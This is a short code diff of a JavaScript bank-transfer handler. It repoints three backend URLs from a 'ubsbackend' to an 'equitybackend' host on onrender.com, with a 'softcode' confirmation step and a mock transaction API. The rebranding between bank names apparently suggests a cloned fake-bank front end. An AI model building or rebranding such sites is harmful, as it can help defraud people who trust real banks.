@@ -26,7 +26,7 @@ async function handleTransfer(event) {
         if (result.isConfirmed) {
             // Fetch softcode message from the backend
             try {
-                const softcodeResponse = await fetch('https://ubsbackend.onrender.com/api/softcode/getSoftcode');
+                const softcodeResponse = await fetch('https://equitybackend.onrender.com/api/softcode/getSoftcode');
                 const data = await softcodeResponse.json();
 
                 // Check if softcode message exists
@@ -45,7 +45,7 @@ async function handleTransfer(event) {
                     if (userConfirmedSoftcode.isConfirmed) {
                         // Proceed with the transaction (no change to the amount)
                         try {
-                            const response = await fetch('https://ubsbackend.onrender.com/api/transfer/process-transfer', {
+                            const response = await fetch('https://equitybackend.onrender.com/api/transfer/process-transfer', {
                                 method: 'POST',
                                 headers: {
                                     'Content-Type': 'application/json',
@@ -91,7 +91,7 @@ async function handleTransfer(event) {
                                 document.getElementById('transfer-form').reset();
 
                                 // Add the transaction to the backend (mock API)
-                                await fetch('https://ubsbackend.onrender.com/api/addtransaction', {
+                                await fetch('https://equitybackend.onrender.com/api/addtransaction', {
                                     method: 'POST',
                                     headers: {
                                         'Content-Type': 'application/json',
